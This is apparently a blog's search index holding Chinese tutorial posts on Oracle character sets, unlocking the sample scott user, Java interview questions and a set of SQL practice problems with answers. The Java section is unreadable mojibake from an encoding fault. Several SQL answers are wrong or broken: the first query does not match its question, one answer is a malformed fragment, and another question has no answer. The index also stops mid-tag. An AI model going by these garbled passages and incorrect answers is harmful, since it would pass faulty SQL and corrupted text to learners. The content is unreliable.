<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>字符集相关</title>
    <link href="undefined2020/03/12/%E5%AD%97%E7%AC%A6%E9%9B%86%E7%9B%B8%E5%85%B3/"/>
    <url>2020/03/12/%E5%AD%97%E7%AC%A6%E9%9B%86%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h5 id="oracle的编码格式涉及三方面的字符集，"><a href="#oracle的编码格式涉及三方面的字符集，" class="headerlink" title="oracle的编码格式涉及三方面的字符集，"></a>oracle的编码格式涉及三方面的字符集，</h5><ol><li>oracel server端的字符集; </li><li>oracle client端的字符集; </li><li>dmp文件的字符集。</li></ol><p>为避免出现乱码需要将以上字符集统一。</p><h5 id="服务端字符集查看方法"><a href="#服务端字符集查看方法" class="headerlink" title="服务端字符集查看方法"></a><strong>服务端字符集查看方法</strong></h5><pre><code>select userenv(&#39;language&#39;) from dual;</code></pre><h5 id="客户端字符集查看方法"><a href="#客户端字符集查看方法" class="headerlink" title="客户端字符集查看方法"></a><strong>客户端字符集查看方法</strong></h5><p>Linux：</p><pre><code>echo $NLS_LANG</code></pre><p>win：</p><p>查看环境变量</p><p>NLS_LANG：AMERICAN_AMERICA.AL32UTF8</p><p>Linux：</p><p>查看环境变量</p><p>echo $NLS_LANG</p><h5 id="dmp文件查看方法"><a href="#dmp文件查看方法" class="headerlink" title="dmp文件查看方法"></a><strong>dmp文件查看方法</strong></h5><p>select nls_charset_name(to_number(‘0354’,’xxxx’)) from dual;</p><p>为ZHS16GBK则支持中文</p><p>select nls_charset_name(to_number(‘0369’,’xxxx’)) from dual; </p><p>为AL32UTF8则支持中文</p><p>如果dmp文件很大，比如有2G以上(这也是最常见的情况)，用文本编辑器打开很慢或者完全打不开，可以用以下命令(在unix主机上): </p><p>cat exp.dmp |od -x|head -1|awk ‘{print 223}’|cut -c 3-6 </p><h5 id="修改服务端编码方法"><a href="#修改服务端编码方法" class="headerlink" title="修改服务端编码方法"></a><strong>修改服务端编码方法</strong></h5><pre><code class="sql">SQL&gt; shutdown immediate;SQL&gt; startup mount;SQL&gt; alter system enable restricted session;System altered.SQL&gt; alter database open;Database altered.SQL&gt; ALTER DATABASE character set INTERNAL_USE AL32UTF8; Database altered.SQL&gt; alter system disable restricted session;System altered</code></pre><h5 id="修改客户端编码方法"><a href="#修改客户端编码方法" class="headerlink" title="修改客户端编码方法"></a>修改客户端编码方法</h5><p>linux添加环境变量：</p><pre><code>export NLS_LANG=AMERICAN_AMERICA.AL32UTF8</code></pre><p>win添加环境变量</p><pre><code>NLS_LANG：AMERICAN_AMERICA.AL32UTF8</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>oracle介绍及解锁scott用户</title>
    <link href="undefined2020/03/12/oracle%E4%BB%8B%E7%BB%8D%E5%8F%8A%E8%A7%A3%E9%94%81scott%E7%94%A8%E6%88%B7/"/>
    <url>2020/03/12/oracle%E4%BB%8B%E7%BB%8D%E5%8F%8A%E8%A7%A3%E9%94%81scott%E7%94%A8%E6%88%B7/</url>
    
    <content type="html"><![CDATA[<h5 id="1，收费标准"><a href="#1，收费标准" class="headerlink" title="1，收费标准"></a>1，收费标准</h5><p>​    软件完全开放下载，安装和使用不做任何限制。但是你要是企业用，就得购买授权，如果被别人举报，让oracle公司查到的话就会起诉罚钱的。<br>​    普通版本，一个cup一年3.5万，买断18万，服务费18*22%；</p><h5 id="2，安装好oracle后需要的服务"><a href="#2，安装好oracle后需要的服务" class="headerlink" title="2，安装好oracle后需要的服务"></a>2，安装好oracle后需要的服务</h5><p>​    1，OracleOraDb10g_home1TNSListener:Oracle服务器监听器，用于监听客户端的连接请求。该服务在使用Oracle时必须开启，否则无法连接Oracle数据库。<br>​    2，OracleServiceORCL:Oracle数据库服务。正常使用Oracle数据库时必须开启<br>​    3，OracleOraDb10g_home1iSQL*Plus：Oracle的网页版查询分析器的服务器端，查询分析器的URL在安装结束时的最后一个界面中已经给出。<br>​    4，OracleDBConsoleorcl:Oracle的企业管理器(EM)的服务器端，EM的访问地址在安装结束时的最后一个界面中已经给出，需要从浏览器中键入EM的URL地址来访问，一般由DBA使用，用于监测和管理Oracle服务器的运行状态。<br>​    5，OracleJobSchedulerORCL:用于Oracle数据库工作日程调度的服务,一般没有安排工作日程就不需要启动。</p><h5 id="3，内存结构："><a href="#3，内存结构：" class="headerlink" title="3，内存结构："></a>3，内存结构：</h5><p>​    内存结构=SGA+PGA+常驻后台进程<br>​        实例：SGA+常驻后台进程<br>​        查看系统全局区的大小：<br>​        SQL&gt;show sga<br>​    物理结构=参数文件+数据文件+控制文件+日志文件+其他<br>​        查看主要物理文件所在路径使用(sys登录):<br>​        select name from v$controlfile;<br>​        select member from v$logfile;<br>​        select name from v$datafile;<br>​    逻辑结构=表空间+段+区+块</p><h5 id="4，登录"><a href="#4，登录" class="headerlink" title="4，登录"></a>4，登录</h5><p>​    sqlplus /nolog<br>​    conn sys/000000 as sysdba<br>​    1，sys：这个账户相当于SQLserver中的sa账户，是个超级账户，拥有的权限最大，可以完成数据库的所有管理任务。<br>​    2，system:没有sys的权限大，通常用来创建一些用于查看管理信息的表和视图,同样也不建议使用system架构来创建一些与管理无关的表或视图。<br>​    3，启用scott用户<br>​        给scott用户解锁【语法格式】（默认的scott用户是锁定的）：alter user scott account unlock<br>​        然后连接：conn scott/tiger<br>​    4，查看当前链接的数据库名称    </p><pre><code>select name from v$database；</code></pre><p>5，listener.ora文件和tnsnames.ora作用</p><pre><code>tnsnames.ora：提供的tnsname到主机名或者ip的对应    listener.ora：监听器进程的配置文件，接受远程对数据库的接入申请并转交给oracle的服务器进程</code></pre><p>6，解锁Scott用户</p><pre><code>    alter user scott identified by 1234 account unlock;    授权:    grant connect to scott; --授予scott连接oracle的权限    grant unlimited tablespace to scott; --授予scott无限使用表空间的权限    grant resource to scott; --授予scott能使用oracle资源的权限    grant select on V_$session to scott;    grant select on V_$sesstat to scott;    grant select on V_$statname to scott;</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java练习题</title>
    <link href="undefined2020/03/12/java%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <url>2020/03/12/java%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>ʲô��JDK<br>��:Java���Կ������߰�<br>ʲô��JRE<br>��:JAVA�����л���<br>ʲôJVM<br>��:JAVA�����<br>����MVC���ģʽ<br>��: ģ�� ��ͼ ������<br>��Ŀ���������淶<br>��:�շ������� ÿһ����������ĸ��д<br>�����������淶<br>��:com.��˾��.��Ŀ��.ģ����<br>�����������淶<br>��: �շ�ʽ������ÿ����������ĸ��д<br>�������������淶<br>��:�ӵڶ������ʿ�ʼ������ĸ��д<br>�������������淶<br>��: ���»��ߡ���ĸ����Ԫ����ͷ,������»��ߡ���ĸ����Ԫ���Լ�������û�г������ƣ��Դ�Сд����<br>��ô��������<br>��:new ���췽��������<br>��ô�������췽��<br>��:public+�����������б���{}<br>һ���࣬����ô��������»��Զ�����һ���޲ι��췽��<br>��:û���޲ι��췽����ʱ��<br>ʲô�Ƿ���������<br>��:һ�����У���������ͬ,�����б���ͬ<br>����static�ؼ���<br>��:��̬���δ�,�������ξ�̬���󡢷��������<br>������������<br>��:�̳У���װ����̬������(�ɼӿɲ���)<br>��װ�Ĺؼ�����ʲô����������<br>��:private ֻ�е�ǰ��Ķ��󷽷�����ֱ�ӵ���<br>һ����װ�࣬Ӧ��ʹ��ʲô�������úͻ�ȡ��������<br>��:get  set ����<br>����this�ؼ���<br>��:��ǰ����<br>����return�ؼ���<br>��:�����޷���ֵʱ�����������������л���ֵʱ�����ط������͡�<br>�̳еĹؼ�����ʲô<br>��:extends, super, protected, private<br>����̳и��࣬�Ǽ̳��˸����ʲô<br>��:���� ���� ����<br>ʲô�Ƿ�������д<br>��:��д���ڼ̳� �����岻ͬ ������ͬ<br>����super�ؼ���<br>��:�ڹ��췽��ǰ��Ĭ�����ӵ� ���ø���Ĺ��췽��<br>�����쳣���﷨��ʲô<br>��:try {}catch{}<br>��ʲô����±�������쳣�Ĳ���<br>��:IO�������ر�<br>�׳��쳣�Ĺؼ�����ʲô<br>��:throws<br>ʲô������ת����ת����<br>��:�Զ�ת����<br>ʲô������ת��<br>��:��ת�ӣ�ǿ��ת�����м̳й�ϵ��<br>����finally<br>��:���쳣������󲻹���������ִ�����ķ���<br>����final�ؼ���<br>��:���峣��<br>����Ĺؼ�����ʲô<br>��:abstract<br>ʲô�ǳ�����<br>��:�ඨ��ǰ����abstract�ؼ��ֵľ���<br>ʲô�ǳ��󷽷�<br>��:��������abstract�ؼ��ֵľ���<br>ʲô�ǽӿ�<br>��:�ӿڶ��巽���͹淶 ����������ʵ��ʵ�ֽӿں����ʵ�ֽӿ�����ķ���<br>�ӿڵĹؼ�����ʲô<br>��:interface<br>ʵ�ֽӿڵĹؼ�����ʲô<br>��:implements<br>List��Set������ʲô����<br>��:list�����нṹ Set�����нṹ<br>List��map������ʲô����<br>��:list����ֻ��һ�� Map����&lt;key��value&gt;<br>public��protected��Ĭ�ϣ�private���������η���ʲô����<br>��: public ������ �ɱ�ͬһ��Ŀ�����е�����ʡ�<br>����default Ĭ�ϵ� �ɱ�ͬһ�����е�����ʡ�<br>protected �ܱ����� ���Ա�����౾������;ͬһ�����е����������������;������������ʡ�<br>private ˽�е� ֻ�ܱ�����౾�����ʡ�<br>д��һ����������������<br>��:InputStreatm<br>д��һ���������������<br>��:outputStreatm<br>�������̵߳ķ�ʽ����Щ<br>��:Thread  Runnable<br>ͬ���Ĺؼ�����ʲô<br>��:synchronized </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>mysql50道经典题</title>
    <link href="undefined2020/03/11/mysql50%E9%81%93%E7%BB%8F%E5%85%B8%E9%A2%98/"/>
    <url>2020/03/11/mysql50%E9%81%93%E7%BB%8F%E5%85%B8%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>1,用一条SQL语句,查询出每门课都大于80分的学生姓名<br>name   kecheng   fenshu<br>张三     语文       81<br>张三     数学       75<br>李四     语文       76<br>李四     数学       90<br>王五     语文       81<br>王五     数学       100<br>王五     英语       90</p><pre><code>SELECT NAME,KECHENG,SCORE FROM STUDENT_1 WHERE SCORE &gt;80;</code></pre><p>2,所有部门之间的比赛组合<br>一个叫department的表，里面只有一个字段name,一共有4条纪录，分别是a,b,c,d,对应四个球对，现在四个球对进行比赛，用一条sql语句显示所有可能的比赛组合.<br>答:<br>SELECT a.name,b.name<br>FROM<br>(SELECT name from DEPARTMENT_2) a,<br>(SELECT name from DEPARTMENT_2) b<br>where a.name&lt;b.name;<br>3,统计每年每月的信息<br>year  month amount<br>1991   1     1.1<br>1991   2     1.2<br>1991   3     1.3<br>1991   4     1.4<br>1992   1     2.1<br>1992   2     2.2<br>1992   3     2.3<br>1992   4     2.4<br>查成这样一个结果<br>year m1  m2  m3  m4<br>1991 1.1 1.2 1.3 1.4<br>1992 2.1 2.2 2.3 2.4 </p><pre><code>    SELECT YEAR,    (SELECT AMOUNT FROM AMOUNTS_3 WHERE MOUNTH = 1 AND YEAR = a.YEAR) m1,    (SELECT AMOUNT FROM AMOUNTS_3 WHERE MOUNTH = 2 AND YEAR = a.YEAR) m2,    (SELECT AMOUNT FROM AMOUNTS_3 WHERE MOUNTH = 3 AND YEAR = a.YEAR) m3,    (SELECT AMOUNT FROM AMOUNTS_3 WHERE MOUNTH = 4 AND YEAR = a.YEAR) m4    FROM AMOUNTS_3 A    GROUP BY YEAR;或者    SELECT DISTINCT YEAR,    (SELECT AMOUNT FROM AMOUNTS_3 WHERE MOUNTH = 1 AND YEAR = a.YEAR) m1,    (SELECT AMOUNT FROM AMOUNTS_3 WHERE MOUNTH = 2 AND YEAR = a.YEAR) m2,    (SELECT AMOUNT FROM AMOUNTS_3 WHERE MOUNTH = 3 AND YEAR = a.YEAR) m3,    (SELECT AMOUNT FROM AMOUNTS_3 WHERE MOUNTH = 4 AND YEAR = a.YEAR) m4    FROM AMOUNTS_3 A    ORDER BY YEAR;</code></pre><pre><code>DISTINCT:返回唯一不同的值</code></pre><p>4,删除除了id号不同,其他都相同的学生冗余信息<br>学生表 如下:<br>id号   学号   姓名 课程编号 课程名称 分数<br>1        2005001  张三  0001      数学    69<br>2        2005002  李四  0001      数学    89<br>3        2005001  张三  0001      数学    69</p><pre><code>DELETE FROM STUDENT_4 WHERE (STU_NO,NAME,CLASS_NO,CLASS_NAME,SCORE) in(    SELECT STU_NO,NAME,CLASS_NO,CLASS_NAME,SCORE    FROM STUDENT_4     GROUP BY STU_NO,NAME,CLASS_NO,CLASS_NAME,SCORE    HAVING COUNT(1)&gt;1    )AND ROWID NOT IN(    SELECT MIN(ROWID) FROM STUDENT_4     GROUP BY STU_NO,NAME,CLASS_NO,CLASS_NAME,SCORE    HAVING COUNT(1)&gt;1);</code></pre><pre><code>ROWID:伪列,每一行数据都有一个唯一的标识符,真实存在</code></pre><p>5,求出小于45岁的各个老师所带的大于12岁的学生人数<br>数据库中有3个表 teacher 表，student表，tea_stu关系表。<br>teacher 表 teaID name age<br>student 表 stuID name age<br>teacher_student表 teaID stuID<br>要求用一条sql查询出这样的结果<br>    1.显示的字段要有老师name, age 每个老师所带的学生人数<br>    2 只列出老师age为40以下，学生age为12以上的记录</p><pre><code>SELECT b.NAME,b.AGE,COUNT(1)FROM STUDENT_5 a,TEACHER_5 b,TEA_STU_5 cWHERE a.stuid = c.stuid AND b.teaid = c.teaid AND b.age&lt;40 AND a.age&gt;12GROUP BY b.name,b.age,b.teaid;</code></pre><p>6,<br>    Student(S#,Sname,Sage,Ssex) 学生表<br>        S#：学号；<br>        Sname：学生姓名；<br>        Sage：学生年龄；<br>        Ssex：学生性别<br>    Course(C#,Cname,T#) 课程表<br>        C#,课程编号；<br>        Cname：课程名字；<br>        T#：教师编号<br>    SC(S#,C#,score) 成绩表<br>        S#：学号；<br>        C#,课程编号；<br>        score：成绩<br>    Teacher(T#,Tname) 教师表<br>        T#：教师编号；<br>        Tname：教师名字<br>    问题： </p><h5 id="1、查询“001”课程比“002”课程成绩高的所有学生的学号；"><a href="#1、查询“001”课程比“002”课程成绩高的所有学生的学号；" class="headerlink" title="1、查询“001”课程比“002”课程成绩高的所有学生的学号；"></a>1、查询“001”课程比“002”课程成绩高的所有学生的学号；</h5><pre><code>SELECT a.S# FROM(SELECT S#,SCORE FROM SC_6 WHERE C#=&#39;001&#39;) a,(SELECT S#,SCORE FROM SC_6 WHERE C#=&#39;002&#39;) bWHERE a.S# = b.S# AND a.SCORE&gt;b.SCORE;</code></pre><h5 id="2、查询平均成绩大于60分的同学的学号和平均成绩；"><a href="#2、查询平均成绩大于60分的同学的学号和平均成绩；" class="headerlink" title="2、查询平均成绩大于60分的同学的学号和平均成绩；"></a>2、查询平均成绩大于60分的同学的学号和平均成绩；</h5><p>​    </p><pre><code>SELECT S#,AVG(SCORE) FROM SC_6 GROUP BY S#HAVING AVG(SCORE)&gt;60;</code></pre><h5 id="3、查询所有同学的学号、姓名、选课数、总成绩；"><a href="#3、查询所有同学的学号、姓名、选课数、总成绩；" class="headerlink" title="3、查询所有同学的学号、姓名、选课数、总成绩；"></a>3、查询所有同学的学号、姓名、选课数、总成绩；</h5><pre><code>SELECT STUDENT_6.S# 学号,SNAME 姓名,COUNT(1) 选课数,SUM(SCORE) 总成绩FROM SC_6,STUDENT_6WHERE SC_6.S# = STUDENT_6.S#GROUP BY STUDENT_6.S#,SNAME;</code></pre><h5 id="4、查询姓“李”的老师的个数；"><a href="#4、查询姓“李”的老师的个数；" class="headerlink" title="4、查询姓“李”的老师的个数；"></a>4、查询姓“李”的老师的个数；</h5><p>​    </p><pre><code>SELECT COUNT(1) FROM TEACHER_6 WHERE TNAME LIKE(&#39;李%&#39;);</code></pre><pre><code>--LIKE 模糊查询 后面跟通配符 _:一个任意字符 %:多个任意字符</code></pre><h5 id="5、查询没学过“叶平”老师课的同学的学号、姓名；"><a href="#5、查询没学过“叶平”老师课的同学的学号、姓名；" class="headerlink" title="5、查询没学过“叶平”老师课的同学的学号、姓名；"></a>5、查询没学过“叶平”老师课的同学的学号、姓名；</h5><pre><code>SELECT S#,SNAME FROM STUDENT_6 WHERE S# NOT IN(    SELECT s.S# FROM    TEACHER_6 t,SC_6 s,COURSE_6 c     WHERE t.T# = c.T#  AND c.C# = s.C# AND TNAME = &#39;叶平&#39;);</code></pre><h5 id="6、查询学过“001”并且也学过编号“002”课程的同学的学号、姓名；"><a href="#6、查询学过“001”并且也学过编号“002”课程的同学的学号、姓名；" class="headerlink" title="6、查询学过“001”并且也学过编号“002”课程的同学的学号、姓名；"></a>6、查询学过“001”并且也学过编号“002”课程的同学的学号、姓名；</h5><pre><code>SELECT S#,SNAME FROM STUDENT_6 WHERE S# in(    SELECT a.s# FROM    (SELECT * FROM SC_6 WHERE C# = &#39;001&#39;) a,    (SELECT * FROM SC_6 WHERE C# = &#39;002&#39;) b     WHERE a.s# = b.s#);</code></pre><h5 id="7、查询学过“叶平”老师所教的所有课的同学的学号、姓名；"><a href="#7、查询学过“叶平”老师所教的所有课的同学的学号、姓名；" class="headerlink" title="7、查询学过“叶平”老师所教的所有课的同学的学号、姓名；"></a>7、查询学过“叶平”老师所教的所有课的同学的学号、姓名；</h5><pre><code>SELECT S#,SNAME FROM STUDENT_6 WHERE S# IN(    SELECT s.S# FROM TEACHER_6 t,COURSE_6 c,SC_6 s    WHERE t.T# = c.T#  AND s.C# =c.C#  AND t.TNAME = &#39;叶平&#39;    GROUP BY S.S# HAVING COUNT(1) = (    SELECT COUNT(1) FROM TEACHER_6,COURSE_6     WHERE TEACHER_6.T# = COURSE_6.T#         AND TEACHER_6.TNAME = &#39;叶平&#39;    ));</code></pre><h5 id="8、查询课程编号“002”的成绩比课程编号“001”课程低的所有同学的学号、姓名；"><a href="#8、查询课程编号“002”的成绩比课程编号“001”课程低的所有同学的学号、姓名；" class="headerlink" title="8、查询课程编号“002”的成绩比课程编号“001”课程低的所有同学的学号、姓名；"></a>8、查询课程编号“002”的成绩比课程编号“001”课程低的所有同学的学号、姓名；</h5><pre><code>SELECT S#,SNAME FROM STUDENT_6 WHERE S# IN(    SELECT a.S# FROM    (SELECT S#,SCORE FROM SC_6 WHERE C# =&#39;001&#39;) a,    (SELECT S#,SCORE FROM SC_6 WHERE C# =&#39;002&#39;) b    WHERE a.SCORE&gt;b.SCORE AND a.S# = b.S#);</code></pre><h5 id="9、查询所有课程成绩小于60分的同学的学号、姓名；"><a href="#9、查询所有课程成绩小于60分的同学的学号、姓名；" class="headerlink" title="9、查询所有课程成绩小于60分的同学的学号、姓名；"></a>9、查询所有课程成绩小于60分的同学的学号、姓名；</h5><pre><code>SELECT S#,SNAME FROM STUDENT_6 WHERE s# NOT IN(SELECT S# FROM SC_6 WHERE SCORE &gt; 60);</code></pre><h5 id="10、查询没有学全所有课的同学的学号、姓名；"><a href="#10、查询没有学全所有课的同学的学号、姓名；" class="headerlink" title="10、查询没有学全所有课的同学的学号、姓名；"></a>10、查询没有学全所有课的同学的学号、姓名；</h5><pre><code>SELECT S#,SNAME FROM STUDENT_6 WHERE s#  NOT IN (SELECT s# FROM SC_6 GROUP BY s# HAVING COUNT(1) = (SELECT COUNT(1) FROM COURSE_6 c,TEACHER_6 tWHERE  c.T# = t.T#) );</code></pre><h5 id="11、查询至少有一门课与学号为“1001”的同学所学相同的同学的学号和姓名；"><a href="#11、查询至少有一门课与学号为“1001”的同学所学相同的同学的学号和姓名；" class="headerlink" title="11、查询至少有一门课与学号为“1001”的同学所学相同的同学的学号和姓名；"></a>11、查询至少有一门课与学号为“1001”的同学所学相同的同学的学号和姓名；</h5><pre><code>SELECT S#,SNAME FROM STUDENT_6 WHERE S# IN(SELECT DISTINCT S# FROM SC_6  WHERE C# IN(SELECT C# FROM SC_6 WHERE S# = &#39;1001&#39;));</code></pre><h5 id="12、查询至少学过学号为“1001”同学所有一门课的其他同学学号和姓名；"><a href="#12、查询至少学过学号为“1001”同学所有一门课的其他同学学号和姓名；" class="headerlink" title="12、查询至少学过学号为“1001”同学所有一门课的其他同学学号和姓名；"></a>12、查询至少学过学号为“1001”同学所有一门课的其他同学学号和姓名；</h5><pre><code>SELECT DISTINCT STUDENT_6.S#,SNAME FROM     STUDENT_6,SC_6 WHERE C# IN(     SELECT C# FROM SC_6 WHERE S# = &#39;1001&#39;     ) AND STUDENT_6.S# = SC_6.S#        AND STUDENT_6.S# NOT IN &#39;1001&#39;;    </code></pre><h5 id="13、把“SC”表中“叶平”老师教的课的成绩都更改为此课程的平均成绩；"><a href="#13、把“SC”表中“叶平”老师教的课的成绩都更改为此课程的平均成绩；" class="headerlink" title="13、把“SC”表中“叶平”老师教的课的成绩都更改为此课程的平均成绩；"></a>13、把“SC”表中“叶平”老师教的课的成绩都更改为此课程的平均成绩；</h5><pre><code>UPDATE SC_6 a SET SCORE =(    SELECT AVG(SCORE) FROM SC_6 WHERE a.C# = C# GROUP BY C#    ) WHERE C# IN(    SELECT C# FROM TEACHER_6,COURSE_6 WHERE TNAME = &#39;叶平&#39;     AND COURSE_6.T# = TEACHER_6.t#    );</code></pre><h5 id="14、查询和“1002”号的同学学习的课程完全相同的其他同学学号和姓名；"><a href="#14、查询和“1002”号的同学学习的课程完全相同的其他同学学号和姓名；" class="headerlink" title="14、查询和“1002”号的同学学习的课程完全相同的其他同学学号和姓名；"></a>14、查询和“1002”号的同学学习的课程完全相同的其他同学学号和姓名；</h5><pre><code>SELECT S# FROM SC_6 WHERE s# NOT IN(    SELECT S# FROM SC_6 WHERE C# NOT IN(        SELECT C# FROM SC_6 WHERE S# = &#39;1002&#39;        )    ) GROUP BY s# HAVING COUNT(1) =(SELECT COUNT(1) FROM SC_6 WHERE S# = &#39;1002&#39; GROUP BY S# );</code></pre><h5 id="15、删除学习“叶平”老师课的SC表记录；"><a href="#15、删除学习“叶平”老师课的SC表记录；" class="headerlink" title="15、删除学习“叶平”老师课的SC表记录；"></a>15、删除学习“叶平”老师课的SC表记录；</h5><pre><code class="DELETE">(SELECT C# FROM COURSE_6,TEACHER_6 WHERE COURSE_6.T# = TEACHER_6.T# AND TNAME = &#39;叶平&#39;);</code></pre><h5 id="16、向SC表中插入一些记录，这些记录要求符合以下条件：没有上过编号“003”课程的同学学号2号课的平均绩；"><a href="#16、向SC表中插入一些记录，这些记录要求符合以下条件：没有上过编号“003”课程的同学学号2号课的平均绩；" class="headerlink" title="16、向SC表中插入一些记录，这些记录要求符合以下条件：没有上过编号“003”课程的同学学号2号课的平均绩；"></a>16、向SC表中插入一些记录，这些记录要求符合以下条件：没有上过编号“003”课程的同学学号2号课的平均绩；</h5><h5 id="17、按平均成绩从高到低显示所有学生的“数据库”、“企业管理”、“英语”三门的课程成绩，按如下形式显示-学生ID-数据库-企业管理-英语-有效课程数-有效平均分"><a href="#17、按平均成绩从高到低显示所有学生的“数据库”、“企业管理”、“英语”三门的课程成绩，按如下形式显示-学生ID-数据库-企业管理-英语-有效课程数-有效平均分" class="headerlink" title="17、按平均成绩从高到低显示所有学生的“数据库”、“企业管理”、“英语”三门的课程成绩，按如下形式显示:学生ID,,数据库,企业管理,英语,有效课程数,有效平均分"></a>17、按平均成绩从高到低显示所有学生的“数据库”、“企业管理”、“英语”三门的课程成绩，按如下形式显示:学生ID,,数据库,企业管理,英语,有效课程数,有效平均分</h5><pre><code>SELECT DISTINCT S#,(SELECT SCORE FROM SC_6,COURSE_6 WHERE SC_6.C# = COURSE_6.C#  AND SC_6.S# = a.S# AND CNAME = &#39;数据库&#39;) 数据库,(SELECT SCORE FROM SC_6,COURSE_6 WHERE SC_6.C# = COURSE_6.C#  AND SC_6.S# = a.S# AND CNAME = &#39;企业管理&#39;) 企业管理,(SELECT SCORE FROM SC_6,COURSE_6 WHERE SC_6.C# = COURSE_6.C#  AND SC_6.S# = a.S# AND CNAME = &#39;英语&#39;) 英语,(SELECT COUNT(1) FROM SC_6,COURSE_6 WHERE SC_6.C# = COURSE_6.C#  AND SC_6.S# = a.S# AND CNAME IN (&#39;英语&#39;,&#39;数据库&#39;,&#39;企业管理&#39;)) 有效课程数,ROUND((SELECT AVG(SCORE) FROM SC_6,COURSE_6 WHERE SC_6.C# = COURSE_6.C# AND SC_6.S# = a.S# AND CNAME IN (&#39;英语&#39;,&#39;数据库&#39;,&#39;企业管理&#39;)),2) 有效平均分FROM SC_6 aORDER BY 有效平均分 DESC;</code></pre><h5 id="18、查询各科成绩最高和最低的分：以如下形式显示：课程ID，最高分，最低分"><a href="#18、查询各科成绩最高和最低的分：以如下形式显示：课程ID，最高分，最低分" class="headerlink" title="18、查询各科成绩最高和最低的分：以如下形式显示：课程ID，最高分，最低分"></a>18、查询各科成绩最高和最低的分：以如下形式显示：课程ID，最高分，最低分</h5><pre><code>SELECT C#,MAX(SCORE) 最高分,MIN(SCORE) 最低分 FROM SC_6 GROUP BY C#; </code></pre><h5 id="19、按各科平均成绩从低到高和及格率的百分数从高到低顺序"><a href="#19、按各科平均成绩从低到高和及格率的百分数从高到低顺序" class="headerlink" title="19、按各科平均成绩从低到高和及格率的百分数从高到低顺序"></a>19、按各科平均成绩从低到高和及格率的百分数从高到低顺序</h5><pre><code>SELECT C#,ROUND((SELECT AVG(SCORE) FROM SC_6 WHERE C# = a.C# GROUP  BY C#),2) 平均分,(ROUND((SELECT COUNT(1) FROM SC_6 WHERE a.C# = C# AND SCORE&gt;60 GROUP BY C#)/(SELECT COUNT(1) FROM SC_6 WHERE a.C# = C#  GROUP BY C#),2)*100 || &#39;%&#39;) 及格率FROM COURSE_6 aORDER BY 平均分 asc,及格率 DESC; </code></pre><h5 id="20、查询如下课程平均成绩和及格率的百分数-用”1行”显示-企业管理（001），马克思（002），OO-amp-UML-（003），数据库（004）"><a href="#20、查询如下课程平均成绩和及格率的百分数-用”1行”显示-企业管理（001），马克思（002），OO-amp-UML-（003），数据库（004）" class="headerlink" title="20、查询如下课程平均成绩和及格率的百分数(用”1行”显示): 企业管理（001），马克思（002），OO&amp;UML （003），数据库（004）"></a>20、查询如下课程平均成绩和及格率的百分数(用”1行”显示): 企业管理（001），马克思（002），OO&amp;UML （003），数据库（004）</h5><pre><code>SELECT CNAME,ROUND((SELECT AVG(SCORE) FROM SC_6 WHERE C# = a.C# GROUP  BY C#),2) 平均分,(ROUND((SELECT COUNT(1) FROM SC_6 WHERE a.C# = C# AND SCORE&gt;60 GROUP BY C#)/(SELECT COUNT(1) FROM SC_6 WHERE a.C# = C#  GROUP BY C#),2)*100 || &#39;%&#39;) 及格率FROM COURSE_6 aWHERE c# IN (&#39;001&#39;,&#39;002&#39;,&#39;003&#39;,&#39;004&#39;); </code></pre><h5 id="21、查询不同老师所教不同课程平均分从高到低显示"><a href="#21、查询不同老师所教不同课程平均分从高到低显示" class="headerlink" title="21、查询不同老师所教不同课程平均分从高到低显示"></a>21、查询不同老师所教不同课程平均分从高到低显示</h5><pre><code>SELECT (SELECT TNAME FROM TEACHER_6 WHERE a.T# = T#) 老师,(SELECT CNAME from COURSE_6 WHERE a.C# = C#) 课程,ROUND((SELECT AVG(SCORE) FROM SC_6 where a.C# = C# GROUP BY c#),2) 平均分FROM COURSE_6 aORDER BY 平均分 DESC;</code></pre><h5 id="23、统计列印各科成绩-各分数段人数-课程ID-课程名称-100-85-85-70-70-60-lt-60"><a href="#23、统计列印各科成绩-各分数段人数-课程ID-课程名称-100-85-85-70-70-60-lt-60" class="headerlink" title="23、统计列印各科成绩,各分数段人数:课程ID,课程名称,[100-85],[85-70],[70-60],[ &lt;60]"></a>23、统计列印各科成绩,各分数段人数:课程ID,课程名称,[100-85],[85-70],[70-60],[ &lt;60]</h5><pre><code>SELECT C#,CNAME,(SELECT COUNT(1) FROM SC_6 WHERE a.c# = c# AND SCORE BETWEEN 85 AND 100 GROUP BY C#) &quot;[100-85]&quot;,(SELECT COUNT(1) FROM SC_6 WHERE a.c# = c# AND SCORE BETWEEN 70 AND 84 GROUP BY C#) &quot;[84-70]&quot;,(CASE WHEN(SELECT COUNT(1) FROM SC_6 WHERE a.c# = c# AND SCORE BETWEEN 60 AND 69 GROUP BY C#)Is NULL THEN 0ELSE(SELECT COUNT(1) FROM SC_6 WHERE a.c# = c# AND SCORE BETWEEN 60 AND 69 GROUP BY C#) END) &quot;[69-60]&quot;,(SELECT COUNT(1) FROM SC_6 WHERE a.c# = c# AND SCORE &lt;60 GROUP BY C#) &quot;[&lt;60]&quot;FROM COURSE_6 a;</code></pre><h5 id="24、查询学生平均成绩及其名次"><a href="#24、查询学生平均成绩及其名次" class="headerlink" title="24、查询学生平均成绩及其名次"></a>24、查询学生平均成绩及其名次</h5><pre><code>SELECT a.*,ROWNUM 名次 FROM (SELECT S#,    ROUND(AVG(SCORE), 2) 平均成绩     FROM SC_6     GROUP BY S#     ORDER BY 平均成绩 DESC) a;</code></pre><h5 id="25、查询各科成绩前三名的记录-不考虑成绩并列情况"><a href="#25、查询各科成绩前三名的记录-不考虑成绩并列情况" class="headerlink" title="25、查询各科成绩前三名的记录:(不考虑成绩并列情况)"></a>25、查询各科成绩前三名的记录:(不考虑成绩并列情况)</h5><pre><code>SELECT * FROM (               SELECT SC_6.S#,               SC_6.C#,               SC_6.SCORE,               ROW_NUMBER() OVER(PARTITION BY SC_6.C# ORDER BY SC_6.SCORE DESC) RN               FROM SC_6) AWHERE A.RN &lt;= 3;</code></pre><pre><code>ROW_NUMBER() OVER(PARTITION BY 列名1 ORDER BY 列名2 DESC---------当列明1相同时，对列名2进行升序</code></pre><h5 id="26、查询每门课程被选修的学生数"><a href="#26、查询每门课程被选修的学生数" 